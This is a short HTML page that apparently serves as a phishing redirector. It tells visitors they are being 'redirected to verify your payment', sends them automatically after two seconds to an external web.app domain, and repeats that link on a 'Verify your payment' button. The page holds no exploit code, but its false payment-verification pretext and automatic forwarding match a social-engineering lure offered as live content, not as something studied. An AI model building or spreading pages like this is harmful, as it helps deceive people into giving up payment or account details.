<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Redirecting...</title>

<style>
body{
  margin:0;
  font-family: Arial, Helvetica, sans-serif;
  background:#f5f5f5;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  text-align:center;
}

.container{
  background:white;
  padding:30px;
  border-radius:12px;
  box-shadow:0 5px 20px rgba(0,0,0,0.1);
  max-width:320px;
  width:90%;
}

h2{
  margin-bottom:10px;
}

p{
  color:#555;
  font-size:14px;
}

button{
  margin-top:20px;
  padding:12px 20px;
  border:none;
  background:#2563eb;
  color:white;
  font-size:16px;
  border-radius:8px;
  cursor:pointer;
  width:100%;
}

button:hover{
  background:#1d4ed8;
}

</style>

<script>
setTimeout(function(){
  window.location.href = "https://radiance-ad.web.app";
},2000);
</script>

</head>

<body>

<div class="container">

<h2>Redirecting...</h2>

<p>
You are being redirected to verify your payment.  
If it doesn't happen automatically, click the button below.
</p>

<button onclick="window.location.href='https://radiance-ad.web.app'">
Verify your payment
</button>

</div>

</body>
</html>
